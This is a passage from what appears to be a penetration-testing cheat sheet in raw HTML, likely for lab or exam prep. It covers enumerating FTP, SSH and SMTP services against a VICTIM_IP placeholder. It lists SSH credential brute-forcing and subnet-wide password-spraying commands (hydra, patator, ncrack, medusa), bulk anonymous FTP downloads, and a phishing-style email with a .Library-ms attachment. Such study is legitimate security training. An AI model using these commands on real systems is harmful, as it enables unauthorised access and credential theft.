support)\nftp://anonymous:anonymous@VICTIM_IP\n\n# interaction using the 'ftp' app\nftp\u0026gt; anonymous # username\nftp\u0026gt; anonymous # password\nftp\u0026gt; help # show list of supported commands\nftp\u0026gt; help CMD # show command-specific help\nftp\u0026gt; binary # set transmission to binary instead of ascii\nftp\u0026gt; ascii # set transmission to ascii instead of binary\nftp\u0026gt; ls -a # list all files (even hidden) (yes, they could be hidden)\nftp\u0026gt; cd DIR # change remote directory\nftp\u0026gt; lcd DIR # change local directory\nftp\u0026gt; pwd # print working directory\nftp\u0026gt; cdup  # change to remote parent directory\nftp\u0026gt; mkdir DIR # create directory\nftp\u0026gt; get FILE [NEWNAME] # download file to kali [and save as NEWNAME]\nftp\u0026gt; mget FILE1 FILE2 ... # get multiple files\nftp\u0026gt; put FILE [NEWNAME] # upload local file to FTP server [and save as NEWNAME]\nftp\u0026gt; mput FILE1 FILE2 ... # put multiple files\nftp\u0026gt; rename OLD NEW # rename remote file\nftp\u0026gt; delete FILE # delete remote file\nftp\u0026gt; mdelete FILE1 FILE2 ... # multiple delete remote files\nftp\u0026gt; mdelete *.txt # delete multiple files matching glob pattern\nftp\u0026gt; bye # exit, quit - all exit ftp connection\n\n# interaction with netcat/telnet:\nUSER anonymous\nPASS anonymous\nTYPE i # set transmission type to binary instead of ascii\nTYPE a # set transmission type to ascii\nLIST # list files\nRETR FILE # get file\nSTOR FILE # put file, overwriting existing\nSTOU FILE # put file, don't overwrite existing\nAPPE FILE # put file, appending to existing\nCWD DIR # change remote working directory\nDELE FILE # delete file\nQUIT # exit\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ways to connect, in order of preference\u003c/span\u003e\nftp -A VICTIM_IP \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-A' forces active mode (not passive)\u003c/span\u003e\nnc -nvC VICTIM_IP 21\ntelnet VICTIM_IP 21\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connect in your filesystem explorer:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (Chrome and Firefox removed FTP support)\u003c/span\u003e\nftp://anonymous:anonymous@VICTIM_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interaction using the 'ftp' app\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e anonymous \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e username\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e anonymous \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e password\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ehelp\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show list of supported commands\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ehelp\u003c/span\u003e CMD \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show command-specific help\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e binary \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set transmission to binary instead of ascii\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e ascii \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set transmission to ascii instead of binary\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e ls -a \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all files (even hidden) (yes, they could be hidden)\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ecd\u003c/span\u003e DIR \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change remote directory\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e lcd DIR \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change local directory\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003epwd\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e print working directory\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e cdup  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change to remote parent directory\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mkdir DIR \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create directory\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e get FILE [NEWNAME] \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e download file to kali [and save as NEWNAME]\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mget FILE1 FILE2 ... \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get multiple files\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e put FILE [NEWNAME] \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e upload local file to FTP server [and save as NEWNAME]\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mput FILE1 FILE2 ... \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e put multiple files\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e rename OLD NEW \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e rename remote file\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e delete FILE \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete remote file\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mdelete FILE1 FILE2 ... \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e multiple delete remote files\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mdelete \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.txt \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete multiple files matching glob pattern\u003c/span\u003e\nftp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e bye \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e exit, quit - all exit ftp connection\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interaction with netcat/telnet:\u003c/span\u003e\nUSER anonymous\nPASS anonymous\nTYPE i \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set transmission type to binary instead of ascii\u003c/span\u003e\nTYPE a \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set transmission type to ascii\u003c/span\u003e\nLIST \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list files\u003c/span\u003e\nRETR FILE \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get file\u003c/span\u003e\nSTOR FILE \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e put file, overwriting existing\u003c/span\u003e\nSTOU FILE \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e put file, don't overwrite existing\u003c/span\u003e\nAPPE FILE \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e put file, appending to existing\u003c/span\u003e\nCWD DIR \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change remote working directory\u003c/span\u003e\nDELE FILE \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete file\u003c/span\u003e\nQUIT \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e exit\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eBatch Download (all files)\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# '-m' mirrors the site, downloading all files\nwget -m ftp://anonymous:anonymous@VICTIM_IP\nwget -m --no-passive ftp://anonymous:anonymous@VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-m' mirrors the site, downloading all files\u003c/span\u003e\nwget -m ftp://anonymous:anonymous@VICTIM_IP\nwget -m --no-passive ftp://anonymous:anonymous@VICTIM_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eConfig Files:\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCheck \u003ccode\u003e/etc\u003c/code\u003e folder.\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"ftpusers\nftp.conf\nproftpd.conf\nvsftpd.conf\"\u003e\u003cpre lang=\"ftpusers\" class=\"notranslate\"\u003e\u003ccode\u003eftpusers\nftp.conf\nproftpd.conf\nvsftpd.conf\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf the FTP server supports the PORT command, you can abuse it to scan other hosts via the \u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp#ftpbounce-attack\" rel=\"nofollow\"\u003eFTP Bounce Attack\u003c/a\u003e. Nmap checks for this by default.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.2 SSH/SFTP - 22\u003c/h2\u003e\u003ca id=\"user-content-22-sshsftp---22\" class=\"anchor\" aria-label=\"Permalink: 2.2 SSH/SFTP - 22\" href=\"#22-sshsftp---22\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSecure Shell (SSH) and Secure File Transfer Protocol (SFTP).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFor extremely old versions, check \u003ccode\u003esearchsploit\u003c/code\u003e for vulns. Otherwise, brute-force and user enumeration are usually all you get out of it.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCheck \u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh\" rel=\"nofollow\"\u003eHackTricks\u003c/a\u003e for executing commands with misconfigured SFTP user.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.2.1 SSH Credential Bruteforcing\u003c/h3\u003e\u003ca id=\"user-content-221-ssh-credential-bruteforcing\" class=\"anchor\" aria-label=\"Permalink: 2.2.1 SSH Credential Bruteforcing\" href=\"#221-ssh-credential-bruteforcing\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using hydra\n# '-s PORT' contact service on non-default port\nhydra -V -f -l username -P wordlist.txt -s 2222 ssh://$VICTIM_IP\n\n# spray creds to entire subnet to see if they work on other boxes, too!\nhydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh\n\n# using patator: useful when services (e.g. ssh) are too old for hydra to work\npatator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt\n\nncrack -p 22 --user root -P passwords.txt [-T 5] $VICTIM_IP\nmedusa -u root -P 500-worst-passwords.txt -M ssh -h $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using hydra\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-s PORT' contact service on non-default port\u003c/span\u003e\nhydra -V -f -l username -P wordlist.txt -s 2222 ssh://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e spray creds to entire subnet to see if they work on other boxes, too!\u003c/span\u003e\nhydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using patator: useful when services (e.g. ssh) are too old for hydra to work\u003c/span\u003e\npatator ssh_login host=\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e port=2222 persistent=0 -x ignore:fgrep=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003efailed\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt\n\nncrack -p 22 --user root -P passwords.txt [-T 5] \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\nmedusa -u root -P 500-worst-passwords.txt -M ssh -h \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.2.2 Disable SSH Host Key Checking\u003c/h3\u003e\u003ca id=\"user-content-222-disable-ssh-host-key-checking\" class=\"anchor\" aria-label=\"Permalink: 2.2.2 Disable SSH Host Key Checking\" href=\"#222-disable-ssh-host-key-checking\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePut this at the top of your \u003ccode\u003e~/.ssh/config\u003c/code\u003e to disable it for all hosts:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Host *\n   StrictHostKeyChecking no\n   UserKnownHostsFile /dev/null\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eHost *\n   StrictHostKeyChecking no\n   UserKnownHostsFile /dev/null\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eor use these flags with ssh: \u003ccode\u003e-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH\u003c/h3\u003e\u003ca id=\"user-content-223-use-legacy-key-exchange-algorithm-or-cipher-with-ssh\" class=\"anchor\" aria-label=\"Permalink: 2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH\" href=\"#223-use-legacy-key-exchange-algorithm-or-cipher-with-ssh\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you try to ssh onto a host and get an error like:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Unable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eUnable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can get around this by adding the \u003ccode\u003e-oKexAlgorithms=+diffie-hellman-group1-sha1\u003c/code\u003e flag to your ssh command. Be sure to pick one of the algorithms listed in their offer.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eYou can also specify the \u003ccode\u003eKexAlgorithms\u003c/code\u003e variable in the ssh-config file.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eSimilarly, if you get an error like:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eUnable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can get around this by adding the \u003ccode\u003e-c aes256-cbc\u003c/code\u003e flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.3 SMTP/s - 25,465,587\u003c/h2\u003e\u003ca id=\"user-content-23-smtps---25465587\" class=\"anchor\" aria-label=\"Permalink: 2.3 SMTP/s - 25,465,587\" href=\"#23-smtps---25465587\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Banner grab, command/user enum\nnc -nvC $VICTIM_IP 25  # \u0026quot;-C\u0026quot; forces sending \\r\\n line ending, required by smtp\ntelnet $VICTIM_IP 25  # alternate method, does \\r\\n by default\n# SMTPS\nopenssl s_client -crlf -connect $VICTIM_IP:465 #SSL/TLS without starttls command\nopenssl s_client -starttls smtp -crlf -connect $VICTIM_IP:587\n\n# on telnet/nc connection, try enumerating users manually via:\nEXPN  # get mailing list\nVRFY root  # check if you can use VRFY to enumerate users\n\n# basic enumeration\nnmap -n -v -p25 --script=\u0026quot;smtp-* and safe\u0026quot; -oA nmap/smtp $VICTIM_IP\n\n# enumerate users\nnmap -n -v -p25 --script=\u0026quot;smtp-enum-users\u0026quot; -oA nmap/smtp-users $VICTIM_IP\n# smtp-user-enum lets you check specific usernames, add a domain, and\n# specify the mode (EXPN, VRFY, RCPT) for validation\nsmtp-user-enum -M MODE -U users.txt -D DOMAIN -t $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Banner grab, command/user enum\u003c/span\u003e\nnc -nvC \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 25  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"-C\" forces sending \\r\\n line ending, required by smtp\u003c/span\u003e\ntelnet \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 25  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternate method, does \\r\\n by default\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SMTPS\u003c/span\u003e\nopenssl s_client -crlf -connect \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e:465 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003eSSL/TLS without starttls command\u003c/span\u003e\nopenssl s_client -starttls smtp -crlf -connect \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e:587\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on telnet/nc connection, try enumerating users manually via:\u003c/span\u003e\nEXPN  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get mailing list\u003c/span\u003e\nVRFY root  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check if you can use VRFY to enumerate users\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e basic enumeration\u003c/span\u003e\nnmap -n -v -p25 --script=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esmtp-* and safe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -oA nmap/smtp \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enumerate users\u003c/span\u003e\nnmap -n -v -p25 --script=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esmtp-enum-users\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -oA nmap/smtp-users \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e smtp-user-enum lets you check specific usernames, add a domain, and\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e specify the mode (EXPN, VRFY, RCPT) for validation\u003c/span\u003e\nsmtp-user-enum -M MODE -U users.txt -D DOMAIN -t \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eEnabling Telnet client on Windows (to allow SMTP interaction, requires Admin rights):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-batchfile notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"dism /online /Enable-Feature /FeatureName:TelnetClient\"\u003e\u003cpre\u003edism /online /Enable-Feature /FeatureName:TelnetClient\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOther ideas:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003esend email to user (client-side exploit)\u003c/li\u003e\n\u003cli\u003esend email to invalid address, get DSN report (info leaks?)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eSending email via cmdline:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# first create attachment and body files\n\n# then send email with swaks\nswaks -t recipient@example.com -t recipient2@example.com --from sender@example.com --attach @config.Library-ms --server SMTP_SERVER --body @body.txt --header \u0026quot;Subject: Need help\u0026quot; --suppress-data -ap\n\n# another option is the sendemail tool:\nsendemail -f sender@example.com -t receiver@example.com 